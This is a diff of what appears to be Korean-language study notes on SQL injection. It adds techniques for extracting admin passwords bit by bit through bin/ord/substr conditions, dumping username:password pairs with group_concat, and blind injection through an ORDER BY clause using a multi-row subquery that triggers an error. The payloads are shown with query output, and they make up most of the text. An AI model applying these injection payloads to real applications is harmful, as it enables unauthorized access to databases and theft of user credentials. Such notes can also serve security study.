@@ -100,19 +100,29 @@
 			1 row in set (0.00 sec)
 
 	Bit 연산
-	ASCII는 0부터 127 범위의 문자를 표현할 수 있고,
-	이는 곧 7 개의 비트를 통해 하나의 문자를 나타낼 수 있다는 것을 의미
-	 MySQL에서는 숫자를 비트 형태로 변환하는 bin이라는 함수를 제공
+		ASCII는 0부터 127 범위의 문자를 표현할 수 있고,
+		이는 곧 7 개의 비트를 통해 하나의 문자를 나타낼 수 있다는 것을 의미
+		MySQL에서는 숫자를 비트 형태로 변환하는 bin이라는 함수를 제공
 
-		mysql> select * from users where username='admin' and substr(bin(ord(password)),1,1)=1;
-		+----------+----------+l
-		| username | password |
-		+----------+----------+
-		| admin    | P@ssword |
-		+----------+----------+
-		1 row in set (0.00 sec)
-		mysql> select * from users where username='admin' and substr(bin(ord(password)),2,1)=1;
-		Empty set (0.00 sec)
+			mysql> select * from users where username='admin' and substr(bin(ord(password)),1,1)=1;
+			+----------+----------+l
+			| username | password |
+			+----------+----------+
+			| admin    | P@ssword |
+			+----------+----------+
+			1 row in set (0.00 sec)
+			mysql> select * from users where username='admin' and substr(bin(ord(password)),2,1)=1;
+			Empty set (0.00 sec)
+
+	group_concat
+		아래 쿼리의 결과는 admin:admin,guest:password,test:test1 과 같은 형태를 가진다.
+
+			group_concat(username,0x3a,password)
+
+		응용하면 다음과 같음
+
+			if(ord(substr((select group_concat(username,0x3a,password) from users), 37,1))=126, (select 1 union select 2), 0)
+
 
 
 
@@ -197,6 +207,12 @@
 		ORA-06512: at "CTXSYS.DRITHSX", line 555
 		ORA-06512: at line 1
 		*/
+
+	order를 이용한 SQLI
+		order by절은 관련 없는 하나의 값을 받아도 실행은 되지만 
+		아래 참일 경우와 같이 row가 2개이상인 테이블 형태는 오류가 나온다.
+
+			order by if(ord(substr((select group_concat(username,0x3a,password) from users), 37,1))=126, (select 1 union select 2), 0)
 
 
 
@@ -1277,6 +1293,11 @@
 			1
 			2
 			*/
+
+
+
+
+
 
 
 ***성공 쿼리 모음***
